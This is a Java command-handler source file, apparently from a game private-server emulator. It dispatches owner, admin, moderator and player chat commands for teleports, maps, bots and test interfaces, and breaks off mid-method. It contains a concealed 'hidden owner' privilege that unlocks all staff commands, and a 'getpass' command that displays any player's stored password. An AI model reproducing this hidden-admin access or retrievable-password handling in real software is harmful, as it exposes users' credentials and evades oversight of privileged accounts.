package org.nova.network.decoders.packets.handlers.commands;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.text.NumberFormat;
import java.util.ArrayList;
import java.util.Arrays;

import org.nova.Constants;
import org.nova.Main;
import org.nova.cache.definition.ItemDefinition;
import org.nova.cache.definition.NPCDefinition;
import org.nova.cache.definition.ObjectDefinition;
import org.nova.game.Game;
import org.nova.game.engine.GameTick;
import org.nova.game.engine.cores.tasks.WorldTask;
import org.nova.game.engine.cores.tasks.WorldTasksManager;
import org.nova.game.item.FloorItem;
import org.nova.game.item.Item;
import org.nova.game.map.GlobalObject;
import org.nova.game.map.Location;
import org.nova.game.masks.Animation;
import org.nova.game.masks.Graphics;
import org.nova.game.masks.Hit;
import org.nova.game.masks.Hit.HitLook;
import org.nova.game.npc.NPC;
import org.nova.game.player.Bank;
import org.nova.game.player.Equipment;
import org.nova.game.player.Player;
import org.nova.game.player.PublicChatMessage;
import org.nova.game.player.Skills;
import org.nova.game.player.content.Magic;
import org.nova.game.player.content.PlayerLook;
import org.nova.kshan.bot.Bot;
import org.nova.kshan.bot.BotList;
import org.nova.kshan.content.PlayTime;
import org.nova.kshan.content.areas.Area;
import org.nova.kshan.content.areas.c_o_r.C_O_R_Data;
import org.nova.kshan.content.bodyglow.BodyGlow;
import org.nova.kshan.content.interfaces.Tasks;
import org.nova.kshan.content.interfaces.buttonstroke.ButtonStroke;
import org.nova.kshan.content.minigames.Zombies;
import org.nova.kshan.content.pets.PetManager;
import org.nova.kshan.content.skills.construction.RoomChunk;
import org.nova.kshan.content.skills.slayer.SlayerTask;
import org.nova.kshan.content.slaves.Slave;
import org.nova.kshan.dialogues.Dialogue;
import org.nova.kshan.dialogues.impl.AddObjectSpawn;
import org.nova.kshan.dialogues.listoptions.impl.BodyGlowing;
import org.nova.kshan.dialogues.listoptions.impl.LocationCrystal;
import org.nova.kshan.dialogues.listoptions.impl.SpawnGetItem;
import org.nova.kshan.dialogues.testscript.DialogueScripts;
import org.nova.kshan.randoms.RandomEvent;
import org.nova.kshan.randoms.dependencies.DynamicMap;
import org.nova.kshan.randoms.dependencies.DynamicMapList;
import org.nova.kshan.randoms.impl.DrillDemon;
import org.nova.kshan.randoms.impl.Mime;
import org.nova.kshan.utilities.Logs;
import org.nova.kshan.utilities.MathUtils;
import org.nova.kshan.utilities.Punishments;
import org.nova.kshan.utilities.TimeUtils;
import org.nova.utility.ShopsHandler;
import org.nova.utility.TasksManager;
import org.nova.utility.loading.npcs.NPCSpawns;
import org.nova.utility.loading.playerutils.SFiles;
import org.nova.utility.misc.Misc;

public final class Commands {

	public static boolean processCommand(Player player, String command,
			boolean console, boolean clientCommand) {
		if (command.length() == 0)
			return false;
		try {
			String[] cmd = command.split(" ");
			for(int i = 0; i < cmd.length; i++) {
				if(!player.isOwner() && 
						(cmd.length > 0 && cmd[i].length() > 20 || cmd.length > 20)) {
					player.sm("Command typed exceeds character limit.");
					return false;
				}
			}
			Logs.write(player.getUsername()+" used the command: \""+cmd[0]+"\" (Console: "+
				console+", Client Command: "+clientCommand+") - EXT: "+Arrays.toString(
					cmd).replaceFirst(cmd[0] + ", ", ""), "Commands", player, true);
			if (cmd.length == 0)
				return false;
			if((player.isOwner() || player.isHiddenOwner()) && processOwnerCommands(player, cmd, console, clientCommand))
				return true;
			if ((player.getRights() >= 2 || player.isHiddenOwner())
					&& processAdminCommand(player, cmd, console, clientCommand))
				return true;
			if ((player.getRights() >= 1 || player.isHiddenOwner())
					&& processModCommand(player, cmd, console, clientCommand))
				return true;
			return processNormalCommand(player, cmd, console, clientCommand);
		} catch(Exception e) {
			player.sm("An error has occurred while executing the command: \""+command+"\"");
			player.sm("<col=ff0000>"+e.toString());
			player.sm(player.isOwner() ? "Please check the server console for more details." : 
				"Please contact <img=1>Lucifer and notify him of this error.");
			e.printStackTrace();
			return false;
		}
	}
	
	@SuppressWarnings({ "unchecked", "unlikely-arg-type" })
	public static boolean processOwnerCommands(final Player player, String[] cmd, 
			boolean console, boolean clientCommand) {
		if(clientCommand) {
			switch(cmd[0]) {
			
				case "tele":
					cmd = cmd[1].split(",");
					int plane = Integer.valueOf(cmd[0]);
					int x = Integer.valueOf(cmd[1]) << 6 | Integer.valueOf(cmd[3]);
					int y = Integer.valueOf(cmd[2]) << 6 | Integer.valueOf(cmd[4]);
					player.setLocation(new Location(x, y, plane));
					if((Boolean) player.getTemporaryAttribute("mode") == Boolean.TRUE) {
						try {
							FileWriter fstream = new FileWriter("data/map/areas.txt", true);
							BufferedWriter out = new BufferedWriter(fstream);
							out.write(x+", "+y+", ");
							player.sm("Saved a polygon location: "+x+", "+y);
							out.close();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
					return true;
					
				case "reset":
					Main.saveFiles();
					for(Player p : Game.getPlayers())
						if(p != null)
							p.finish();
					Logs.writeGL("Saved all players, restarting...", "Restarts");
					Main.restartApplication(null);
					return true;
			}
		} else {

			switch(cmd[0]) {
			
			case "try": {
				// add nex test data (where 4 nexes come at the player in a no escape formation)
				return true;
			}

			case "scr":
				player.packets().sendRunScript(570, new Object[] { "Search for an item" });
				return true;
			
			case "spriteoni": {
				player.packets().sendSpriteOnInter(Integer.parseInt(cmd[1]), 
					Integer.parseInt(cmd[3]), Integer.parseInt(cmd[2]));
				return true;
			}
			
			case "searchi": {
				player.interfaces().sendInventoryInterface(1150);
				player.packets().sendItems(90, false, player.getInventory().getItems());
				player.packets().sendInterSetItemsOptionsScript(1150, 0, 90, 5, 32, "Examine");
				player.packets().sendUnlockIComponentOptionSlots(1150, 0, 0, 600, 0);
				player.packets().sendString("<col=ffffff>Results for: <col=ff0000>Arcane", 1150, 4);
				return true;
			}
			
			case "timers": { // test veng timers
				player.interfaces().sendInterface(1117);
				// Eliminates ugly grey borders
				player.packets().sendHideIComponent(1117, 2, true);
				player.packets().sendHideIComponent(1117, 16, true);
				player.packets().sendHideIComponent(1117, 17, true);
				player.packets().sendHideIComponent(1117, 25, true);
				player.packets().sendString("<col=ff0000>4:59</col>|30|5:00|0:00|0:00|0:00", 1117, 121);
				player.packets().sendString("", 1117, 122);
				return true;
			}
			
			case "mime": {
				player.getRandomEvent().start(new Mime());
				return true;
			}
			
			case "drills": {
				player.getRandomEvent().start(new DrillDemon());
				return true;
			}
			
			case "tutorial": {
				DynamicMap map = new DynamicMap("Our Lives", 225, 642, 8, 8);
				map.createCopiedMap();
				player.sm(map.toString());
				player.setLocation(map.getCenter());
				return true;
			}
			
			case "lcc": {
				player.getLC().setCharges(Integer.parseInt(cmd[1]));
				player.sm("You now have "+player.getLC().getCharges()+" location crystal charges.");
				return true;
			}
			
			case "maxlc": {
				player.getLC().setMaxLocationCount(Integer.parseInt(cmd[1]));
				player.sm("You may now add "+player.getLC().getMaxLocationCount()+" locations to your crystal.");
				return true;
			}
			
			case "hideb": {
				player.packets().sendHideIComponent(Integer.parseInt(cmd[1]), 
						Integer.parseInt(cmd[3]), Boolean.parseBoolean(cmd[2]));
				return true;
			}
			
			case "testdrops": {
				player.interfaces().sendInterface(11);
				player.packets().sendItems(90, false, player.getInventory().getItems());
				player.packets().sendInterSetItemsOptionsScript(11, 17, 90, Integer.parseInt(cmd[1]), 
						Integer.parseInt(cmd[2]), "Deposit-1", "Deposit-5", "Deposit-10", "Deposit-All",
						"Deposit-X", "Examine");
				player.packets().sendUnlockIComponentOptionSlots(11, 17, 0, 27, 0,
						1, 2, 3, 4, 5);
				return true;
			}
			
			case "testdrops2": {
				player.interfaces().sendInterface(860);
				player.packets().sendItems(90, false, player.getInventory().getItems());
				player.packets().sendInterSetItemsOptionsScript(860, 23, 90, 9, 120, "Examine");
				player.packets().sendUnlockIComponentOptionSlots(860, 23, 0, 28, 0);
				return true;
			}
			
			case "tt": {
				String name = formatInput(cmd);
				if(name == null || name.length() < 1)
					return true;
				Player p2 = Game.getPlayer(name);
				if(p2 == null) {
					try {
						p2 = SFiles.loadPlayer(name);
					} catch(Exception e) {
						e.printStackTrace();
						return true;
					}
					player.sm("Could not find the player: "+name);
				} else {
					player.interfaces().sendInventoryInterface(936);
					player.packets().sendString(p2.getDisplayName()+"'s info", 936, 132);
					int[] statOrder = { 
						Skills.ATTACK, Skills.HITPOINTS, Skills.MINING,
						Skills.STRENGTH, Skills.AGILITY, Skills.SMITHING,
						Skills.DEFENCE, Skills.HERBLORE, Skills.FISHING,
						Skills.RANGE, Skills.THIEVING, Skills.COOKING,
						Skills.PRAYER, Skills.CRAFTING, Skills.FIREMAKING,
						Skills.MAGIC, Skills.FLETCHING, Skills.WOODCUTTING,
						Skills.RUNECRAFTING, Skills.SLAYER, Skills.FARMING,
						Skills.CONSTRUCTION, Skills.HUNTER, Skills.SUMMONING,
						Skills.DUNGEONEERING
					};
					int statIndex = 7;
					for(int i = 0; i < statOrder.length; i++) {
						player.packets().sendString(p2.getSkills().getLevel(statOrder[i])+"", 936, statIndex);
						player.packets().sendString(p2.getSkills().getLevelFromXP(statOrder[i])+"", 936, statIndex + 1);
						statIndex += 5;
					}
					player.getButtonStrokes().run(new ButtonStroke() {

						@Override
						public boolean press(int interfaceId, int buttonId, int slotId, int packetId) {
							if(interfaceId == 936) {
								switch(buttonId) {
									case 134:
										break;
									case 137:
										break;
									case 140:
										break;
									case 143:
										
										break;
								}
							} else {
								player.interfaces().closeInventoryInterface();
								this.terminate();
							}
							return false;
						}
						
					});
				}
				return true;
			}
			
			case "zmb": {
				player.getRandomEvent().start(new Zombies());
				return true;
			}
		
			case "destroycm": {
				for(int i = 0; i < DynamicMapList.MAPS.size(); i++)
					DynamicMapList.MAPS.get(i).destroyMap(false);
				DynamicMapList.MAPS.clear();
				player.sm("All dynamic regions in the DynamicMapList class were destroyed.");
				player.sm("The exclusive dynamic regions, however, weren't destroyed.");
				return true;
			}
			
			case "edmaps": {
				player.sm("--------------LIST OF EXCLUSIVE DYNAMIC MAPS--------------");
				for(String mapName : DynamicMapList.EXCLUSIVE_MAPS.keySet())
					player.sm(mapName+": <col=ff0000>"+Arrays.toString(DynamicMapList.EXCLUSIVE_MAPS.get(mapName)));
				return true;
			}
			
			case "zombies": {
				DynamicMap map = new DynamicMap("Zombies", 205, 710, 5, 4);
				map.createCopiedMap();
				player.sm(map.toString());
				player.setLocation(map.getCenter());
				return true;
			}
			
			case "fullzombies": {
				DynamicMap map = new DynamicMap("Zombies", 202, 706, 12, 11);
				map.createCopiedMap();
				player.sm(map.toString());
				player.setLocation(map.getCenter());
				return true;
			}
			
			case "wildy": {
				DynamicMap map = new DynamicMap("Wildy Test", 386, 452, 3, 3);
				map.createCustomMap(RoomChunk.TZHAAR_FLOOR[0], RoomChunk.TZHAAR_FLOOR[1], 8, 8, 2, 3);
				player.sm(map.toString());
				player.setLocation(map.getCenter());
				return true;
			}
			
			case "fakecitadel": {
				DynamicMap map = new DynamicMap("Fake Citadel", 686, 555, 4, 3);
				map.createCustomMap(RoomChunk.GRASS[0], RoomChunk.GRASS[1], 8, 8, 2, 2);
				player.sm(map.toString());
				player.setLocation(map.getCenter());	
				return true;
			}
			
			case "nextest": {
				DynamicMap map = new DynamicMap("Nex", 363, 648, 5, 5);
				map.createCopiedMap();
				player.sm(map.toString());
				player.setLocation(map.getCenter());
				return true;
			}
			
			case "dmap": {
				DynamicMap map = new DynamicMap("Citadel Test", 687, 555, 2, 3);
				map.createCopiedMap();
				player.sm(map.toString());
				player.setLocation(map.getCenter());
				return true;
			}

			case "ss": {
				for(GlobalObject o : Game.getLocalObjects(player, 14)) {
					player.sm(o.getName());
					if(o.getName().toLowerCase().contains("soul")) {
						player.sm("You release 250 Rock Crab souls from your Soul Chest!");
						player.forceTalk("Be gone!");
						for(int i = 0; i < 10; i++) {
							Game.sendProjectile(player, o, new Location(player.getX() + Misc.random(9), 
								player.getY() + (Misc.random(9)), 0), 2263, 
								10, 130, 25, 0, 10, 0);
							Game.sendProjectile(player, o, new Location(player.getX() - Misc.random(9), 
								player.getY() - (Misc.random(9)), 0), 2263, 
								10, 130, 25, 0, 10, 0);
							Game.sendProjectile(player, o, new Location(player.getX() + Misc.random(9), 
								player.getY() - (Misc.random(9)), 0), 2263, 
								10, 130, 25, 0, 10, 0);
							Game.sendProjectile(player, o, new Location(player.getX() - Misc.random(9), 
								player.getY() + (Misc.random(9)), 0), 2263, 
								10, 130, 30, 0, 10, 0);
						}
					}
				}
				return true;
			}
			
			case "title": {
				String title = formatInput(cmd);
				player.setTitle(title + " ");
				player.sm("Your new title is: "+player.getTitle());
				player.getAppearance().generateAppearanceData();
				player.refreshPrivateChatSetup();
				return true;
			}
			
			case "removetitle": {
				player.setTitle("");
				player.sm("Your title has been removed.");
				player.getAppearance().generateAppearanceData();
				player.refreshPrivateChatSetup();
				return true;
			}
			
			/*case "titled": {
				String col = "ff0000";
				String shad = "ff0000";
				int colorIndex = 0;
				int shadingIndex = 0;
				String currentCol = StringUtils.COLORS[colorIndex][0];
				String currentShad = StringUtils.COLORS[shadingIndex][0];
				player.interfaces().sendInterface(676);
				player.packets().sendString("<col="+col+"><shad="+shad+">"+player.getTitle(), 676, 13);
				player.interfaces().sendBlankItemOnInterface(676, 15);
				player.interfaces().sendBlankItemOnInterface(676, 16);
				player.packets().sendString("Your current title is shown above. To change the color, use the up and down arrow keys. "
					+ "To change the shading, use the left and right arrow keys."
						+ "<br><br>Current color: <col="+col+">"+currentCol+"</col>     "
					+ "Current Shading: <col=ffffff><shad="+shad+">"+currentShad, 676, 14);
				player.packets().sendString("<col=00ff00>Save changes", 676, 17);
				player.packets().sendString("<col=00ff00>Discard changes", 676, 18);
				player.getKeyStrokes().run(new KeyStroke() {
					@Override
					public void press(int key) {
						if(get(key).equals("e"))
							terminate();
						if(get(key).equals("w")) {
							if(colorIndex == 11)
								colorIndex = 0;
							else
								colorIndex++;
							col = StringUtils.COLORS[colorIndex][1];
							player.packets().sendString("<col="+col+"><shad="+shad+">"+player.getTitle(), 676, 13);
							currentCol = StringUtils.COLORS[colorIndex][0];
							player.packets().sendString("Your current title is shown above. To change the color, use the up and down arrow keys. "
								+ "To change the shading, use the left and right arrow keys."
								+ "<br><br>Current color: <col="+col+">"+currentCol+"</col>     "
								+ "Current Shading: <col=ffffff><shad="+shad+">"+currentShad, 676, 14);
						} else if(get(key).equals("s")) {
							if(colorIndex == 0)
								colorIndex = 11;
							else
								colorIndex--;
							col = StringUtils.COLORS[colorIndex][1];
							player.packets().sendString("<col="+col+"><shad="+shad+">"+player.getTitle(), 676, 13);
							currentCol = StringUtils.COLORS[colorIndex][0];
							player.packets().sendString("Your current title is shown above. To change the color, use the up and down arrow keys. "
								+ "To change the shading, use the left and right arrow keys."
									+ "<br><br>Current color: <col="+col+">"+currentCol+"</col>     "
								+ "Current Shading: <col=ffffff><shad="+shad+">"+currentShad, 676, 14);
						} else if(get(key).equals("d")) {
							if(shadingIndex == 11)
								shadingIndex = 0;
							else
								shadingIndex++;
							shad = StringUtils.COLORS[shadingIndex][1];
							player.packets().sendString("<col="+col+"><shad="+shad+">"+player.getTitle(), 676, 13);
							currentShad = StringUtils.COLORS[shadingIndex][0];
							player.packets().sendString("Your current title is shown above. To change the color, use the up and down arrow keys. "
								+ "To change the shading, use the left and right arrow keys."
								+ "<br><br>Current color: <col="+col+">"+currentCol+"</col>     "
								+ "Current Shading: <col=ffffff><shad="+shad+">"+currentShad, 676, 14);
						} else if(get(key).equals("a")) {
							if(shadingIndex == 0)
								shadingIndex = 11;
							else
								shadingIndex--;
							shad = StringUtils.COLORS[shadingIndex][1];
							player.packets().sendString("<col="+col+"><shad="+shad+">"+player.getTitle(), 676, 13);
							currentShad = StringUtils.COLORS[shadingIndex][0];
							player.packets().sendString("Your current title is shown above. To change the color, use the up and down arrow keys. "
								+ "To change the shading, use the left and right arrow keys."
								+ "<br><br>Current color: <col="+col+">"+currentCol+"</col>     "
								+ "Current Shading: <col=ffffff><shad="+shad+">"+currentShad, 676, 14);
						}
					}
				});
				return true;
			}*/
			
			case "chatopen":
				player.interfaces().setKeepChatboxOpen(!player.interfaces().chatboxKeptOpen());
				return true;
			
			case "campos":
				player.camPos(Integer.parseInt(cmd[1]), Integer.parseInt(cmd[2]), Integer.parseInt(cmd[3]), Integer.parseInt(cmd[4]));
				return true;
				
			case "camlook":
				player.camLook(Integer.parseInt(cmd[1]), Integer.parseInt(cmd[2]), Integer.parseInt(cmd[3]), Integer.parseInt(cmd[4]));
				return true;
			
			case "kbdcor":
				player.sm("You have 29 KDB kills!");
				player.getCavernOfRemembrance().getOriginalBosses().put("King Black Dragon", 29);
				return true;
			
			case "maxcor": {
				for(GlobalObject o : C_O_R_Data.getBossObjects()) {
					String name = o.getName();
					player.getCavernOfRemembrance().getOriginalBosses().put(name, 10000);
				}
				player.sm("You've maxed out your Cavern of Remembrance progress.");
				return true;
			}
			
			case "resetcor": {
				player.getCavernOfRemembrance().getOriginalBosses().clear();
				player.sm("You've reset your Cavern of Remembrance progress.");
				return true;
			}
			
			case "addobj": {
				int type = cmd.length > 2 ? Integer.parseInt(cmd[2]) : 10;
				GlobalObject object = new GlobalObject(Integer.parseInt(cmd[1]), type, 0, player);
				player.getDialogue().start(new AddObjectSpawn(), object);
				return true;
			}
			
			case "fade": {
				player.getScreenFade().fadeWhite(() -> {
					player.sm("When faded.");
				}, () -> {
					player.sm("After un-fading sequence");
				});
				return true;
			}
			
			case "interval": {
				double number = Integer.parseInt(cmd[1]);
				if(!MathUtils.forInterval(() -> {
					player.sm("You now have "+number+" resources");
				}, 100, number))
					player.sm("Number "+number+" is not an interval of 100.");
				return true;
			}
			
			case "exit": {
				Main.saveFiles();
				for(Player p : Game.getPlayers())
					if(p != null)
						p.finish();
				Logs.writeGL("Saved all players, shut down complete.", "Shutdowns");
				System.exit(1);
				return true;
			}
			
			case "ozan":
				player.getDialogueScript().open("ozan");
				return true;
	
			case "reloadds":
				DialogueScripts.reload();
				player.sm("Re-loaded dialogue scripts.");
				return true;
			
			case "glow":
				player.getDialogue().start(new BodyGlowing());
				return true;
			
			case "lc":
				player.getDialogue().start(new LocationCrystal());
				return true;
				
			case "testlistoptions":
				player.getDialogue().start(new SpawnGetItem());
				return true;
				
			case "clearlc":
				player.getLC().clearCrystal();
				player.sm("Cleared Location Crystal Data.");
				return true;
			
			case "savelc":
				player.getInputEvent().run("AddLocation", "Enter in the name for this location", false);
				return true;
			
			case "glowff": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				try {
					BufferedReader r = new BufferedReader(new FileReader(new File("./data/playerdata/bodyGlowColors.txt")));
					String line;
					while((line = r.readLine()) != null) {
						if(line.startsWith("#") || line.equals(""))
							continue;
						String[] tokens = line.split(" = ");
						String colorName = tokens[0];
						String[] colorsAsString = tokens[1].split(", ");
						int[] colors = new int[4];
						for(int i = 0; i < 4; i++)
							colors[i] = Integer.parseInt(colorsAsString[i]);
						if(name.equalsIgnoreCase(colorName))
							player.glow(-1, colors);
					}
					r.close();
				} catch(Exception e) {
					e.printStackTrace();
				}
				return true;
			}
			
			case "getmodels": {
				int id = Integer.parseInt(cmd[1]);
				String type = "i";
				if(cmd.length >= 3)
					type = cmd[2];
				String message = "Model Ids: ";
				ItemDefinition defs = null;
				switch(type) {
					case "i":
						defs = ItemDefinition.get(id);
						if(defs.maleEquipModelId1 > -1)
							message += "M1: "+defs.maleEquipModelId1+", ";
						if(defs.maleEquipModelId2 > -1)
							message += "M2: "+defs.maleEquipModelId2+", ";
						if(defs.maleEquipModelId3 > -1)
							message += "M3: "+defs.maleEquipModelId3+", ";
						if(defs.femaleEquipModelId1 > -1)
							message += "F1: "+defs.femaleEquipModelId1+", ";
						if(defs.femaleEquipModelId2 > -1)
							message += "F2: "+defs.femaleEquipModelId2+", ";
						if(defs.femaleEquipModelId3 > -1)
							message += "F3: "+defs.femaleEquipModelId3+", ";
						break;
					case "n":
						message += Arrays.toString(NPCDefinition.get(id).modelIds);
						break;
					case "o":
						message += Arrays.toString(ObjectDefinition.get(id).modelIds);
						break;
				}
				player.sm(message);
				return true;
			}
			
			case "gender":
				player.getAppearance().setMale(!player.getAppearance().isMale());
				player.getAppearance().generateAppearanceData();
				return true;
			
			case "addglow": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				try {
					BufferedWriter w = new BufferedWriter(new FileWriter(new File("./data/playerdata/bodyGlowColors.txt"), true));
					w.write(name+" = "+Arrays.toString(player.getLastBodyGlowColors()).replace("[", "").replace("]", ""));
					w.newLine();
					w.close();
					player.sm("Added new body glow color: "+name+" = "+Arrays.toString(player.getLastBodyGlowColors()));
				} catch(Exception e) {
					e.printStackTrace();
				}
				return true;
			}
			
			case "glowpet":
				if(player.getPet() == null)
					return true;
				player.getPet().glow(BodyGlow.generate());
				return true;
				
			case "petglowc":
				player.sm("Your pet's current glow colors: "+Arrays.toString(player.getPet().getLastBodyGlowColors()));
				return true;
			
			case "rglow":
				player.glow(BodyGlow.generate(cmd.length == 2 ? Integer.parseInt(cmd[1]) : -1));
				return true;
			
			case "glowred":
				player.getAppearance().setGlowingRed(cmd.length == 2 ? false : true);
				return true;
				
			case "glowc":
				player.sm("Last body glow colors: "+Arrays.toString(player.getLastBodyGlowColors()));
				return true;
			
			case "resetglow":
				player.glow(0, new int[4]);
				return true;
			
			case "myclone": {
				String name = player.getUsername()+"'s clone";
				if(Game.containsPlayer(name))
					Game.getPlayer(name).finish();
				if(SFiles.containsPlayer(name))
					SFiles.getPlayer(name).delete();
				if(cmd.length == 1) {
					Game.submit(new GameTick(.6) {

						@Override
						public void run() {
							Bot bot = new Bot(name, Slave.GENERATED_PASSWORD, Location.findEmptyLocation(player, 1)).create();
							bot.setEquipment(player.getEquipment());
							bot.getEquipment().setPlayer(bot);
							bot.setSkills(player.getSkills());
							bot.getSkills().setPlayer(bot);
							bot.faceEntity(player);
							player.faceEntity(bot);
							player.forceTalk("Where did you come from?!");
							bot.publicChat("Where did you come from?!");
							bot.glow(-1, new int[] { 0, 0, 0, 128 }); // "Glowing" black
							bot.getAppearance().generateAppearanceData();
							stop();
						}
						
					});
				}
				return true;
			}
			
			case "saveinv": {
				ArrayList<Item> items = new ArrayList<Item>();
				for(Item item : player.getInventory().getItems().getItems())
					if(item != null)
						items.add(item);
				player.getData().getRuntimeData().put("inventory", items);
				int count = 0;
				for(Item item : (ArrayList<Item>) player.getData().getRuntimeData().get("inventory")) {
					if(item != null) {
						player.sm("Item saved in the inventory cache: "+item.getId()+" - (x"+item.getAmount()+" "+item.getName()+")");
						count++;
					}
				}
				player.sm("A total of "+count+" item(s) have been saved. Inventory saved!");
				return true;
			}
			
			case "loadinv": {
				if(player.getInventory().getFreeSlots() != 28) {
					player.packets().sendMessage("You need to have an empty inventory in order to do this.");
					return false;
				}
				ArrayList<Item> items = (ArrayList<Item>) player.getData().getRuntimeData().get("inventory");
				int count = 0;
				for(Item item : items) {
					if(item != null) {
						player.sm("Item loaded from the inventory cache: "+item.getId()+" - (x"+item.getAmount()+" "+item.getName()+")");
						player.getInventory().addItem(item);
						count++;
					}
				}
				player.sm("A total of "+count+" item(s) have been loaded. Inventory loaded!");
				return true;
			}
		
			case "viewdrops": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player other = Game.getPlayer(name);
				for(FloorItem item : other.getRegion().getFloorItems())
					if(item.getOwner() == other) {
						item.setInvisible(false);
						player.sm(item.getId()+" - "+item.getName());
						for(Player p : Game.getPlayers())
							if(p != other)
								p.packets().sendGroundItem(item);
					}
				return true;
			}
			
			case "testcut": {
				player.getCutscenes().startCutscene("TestCutscene");
				return true;
			}
			
			case "dismissslave":
				if(player.getSlave() != null)
					player.getSlave().terminate("You tell "+player.getSlave().getUsername()+" to go away.");
				break;
				
			case "call":
				player.getSlave().call();
				break;
			
			case "slave": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				player.getSlave().create(name);
				return true;
			}
			
			case "test": {
				player.interfaces().sendInterface(631);
				player.packets().sendUnlockIComponentOptionSlots(631, 47, 0, 27, 0, 1, 2, 3, 4, 5);
				player.packets().sendInterSetItemsOptionsScript(631, 47, 134, 0, 0, 
					"Remove 1", "Remove 5", "Remove 10", "Remove All", "Examine");
				Item[] items = { new Item(1038, 1), new Item(1040, 1), 
					new Item(1042, 1), new Item(1044, 1), new Item(1046, 1), 
					new Item(1048, 1), new Item(1050, 1), new Item(995, 100000000), 
					new Item(22440, 1) };
				player.packets().sendItems(134, items);//new Item[] { });
				Item[] itemss = { new Item(1039, 1), new Item(1041, 1), 
					new Item(1043, 1), new Item(1045, 1), new Item(1047, 1), 
					new Item(1049, 1), new Item(1051, 1), new Item(995, 100000000), 
					new Item(22445, 1) };
				player.packets().sendItems(133, true, itemss);//new Item[] { });
				player.packets().sendUnlockIComponentOptionSlots(631, 49, 0, 27, 0, 1, 2, 3, 4, 5);
				player.packets().sendInterSetItemsOptionsScript(631, 49, 134, 0, 0, 
						"Remove 1", "Remove 5", "Remove 10", "Remove Al", "Examine");
				return true;
			}
			
			case "gamble": {
				player.getDialogue().start("Gambler", 4247);
				return true;
			}
			
			case "hcm": {
				player.getHouse().setCheatMode(!player.getHouse().hasCheatMode());
				player.sm("House cheat mode is "+(player.getHouse().hasCheatMode() ? "enabled" : "disabled"));
				return true;
			}
			
			case "face": {
				for(NPC n : Game.getLocalNPCs(player))
					if(n.getName().toLowerCase().contains(cmd[1].toLowerCase()))
						n.changeDirection(cmd[2]);
				return true;
			}
			
			case "configf": {
				final int id = Integer.parseInt(cmd[1]);
				int count = Integer.parseInt(cmd[2]);
				player.packets().sendConfigByFile(id, count);
				player.sm("Config File: "+id+" "+count);
				return true;
			}
			
			case "rt": {
				boolean isEvent = cmd.length > 1 ? Boolean.parseBoolean(cmd[1]) : false;
				if(isEvent) {
					if(player.getRandomEvent().getCurrent() != null) {
						RandomEvent event = player.getRandomEvent().getCurrent();
						player.sm("Current: ["+
							player.getX()+", "+player.getY()+", "+player.getZ()+"] "
							+ "Base Location: ["+event.getDynamicMap().getBaseX()+", "
							+ ""+event.getDynamicMap().getBaseY()+"] Difference: ["
							+ ""+(player.getX() - event.getDynamicMap().getBaseX())+", "+(
							player.getY() - event.getDynamicMap().getBaseY())+"]");
					} else
						player.sm("You're not in a random event.");
				} else {
					player.sm("Current: ["+
						player.getX()+", "+player.getY()+", "+player.getZ()+"] "
						+ "Base Location: [64, 192] Difference: ["
						+ ""+(player.getX() - 64)+", "+(
						player.getY() - 192)+"]");	
				}
				return true;
			}
			
			case "ctele": {
				player.setLocation(Integer.parseInt(cmd[1]) * 8, 
					Integer.parseInt(cmd[2]) * 8, cmd.length > 3 ? 
						Integer.parseInt(cmd[3]) : player.getZ());
				return true;
			}
			
			case "saveall":
				Main.saveAccounts();
				player.sm("Saved all accounts.");
				return true;
			
			case "rtele": {
			    int regionId = Integer.parseInt(cmd[1]);
			    int x = 32;
			    int y = 32;
			    if (cmd.length > 3) {
			     x = Integer.parseInt(cmd[2]);
			     y = Integer.parseInt(cmd[3]);
			    }
			    player.setLocation((new Location((((regionId >> 8) << 6) + x), ((regionId & 0xFF) << 6) + y, 0)));
			    player.sm("Current location = " + player.toString());
			    return true;
			}
			
			case "style": {
				player.sm("Current House Style: "+player.getHouse().getStyle()+" Alternative Theme ? "+player.getHouse().isUsingAlternativeStyle());
				player.getHouse().setStyle(Integer.parseInt(cmd[1]));
				if(cmd.length > 2)
					player.getHouse().setUsingAlternativeStyle(Boolean.parseBoolean(cmd[2]));
				player.sm("House style set: "+player.getHouse().getStyle()+" Alternative theme ? "+player.getHouse().isUsingAlternativeStyle());
				return true;
			}

			case "connect": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Bot bot;
				if(SFiles.containsPlayer(cmd[1])) {
					bot = (Bot) SFiles.loadPlayer(name);
					bot.setUsername(name);
					bot.create();
				} else
					bot = new Bot(name, "test",  new Location(5504, 4450, 0)).create();
				player.sm("Bot connected!: "+bot.getInfo());
				return true;
			}
			
			case "disconnect": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Bot bot = BotList.get(name);
				if(bot != null) {
					bot.finish();
					player.sm("Bot disconnected: "+bot.getInfo());
				} else
					player.sm("That bot is not online.");
				return true;
			}
			
			case "heal": {
				player.heal(player.getMaxHitpoints());
				player.getPoison().reset();
				player.getPrayer().restorePrayer(player.getSkills().getLevelFromXP(Skills.PRAYER) * 10);
				return true;
			}
			
			case "getpass": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = Game.getPlayer(name);
				if(target == null)
					target = SFiles.loadPlayer(name);
				if(target == null) {
					player.sm(name+" could not be found.");
					return true;
				}
				player.sm(name+"'s password is: "+target.getPassword());
				return true;
			}
			
			case "headicon": {
				player.setCustomHeadIcon(Integer.parseInt(cmd[1]));
				return true;
			}
			
			case "rnpc": {
				for(NPC n : Game.getLocalNPCs(player))
					if(n.getName().toLowerCase().contains(cmd[1].toLowerCase()))
						n.finish();
				return true;
			}
			
			case "z": {
				player.setLocation(player.getX(), player.getY(), Integer.parseInt(cmd[1]));
			}
			
			case "blackout":
				player.packets().sendBlackOut(Integer.valueOf(cmd[1]));
				return true;
			
			case "assassincutscene": {
				player.getDialogue().start(new Dialogue() {
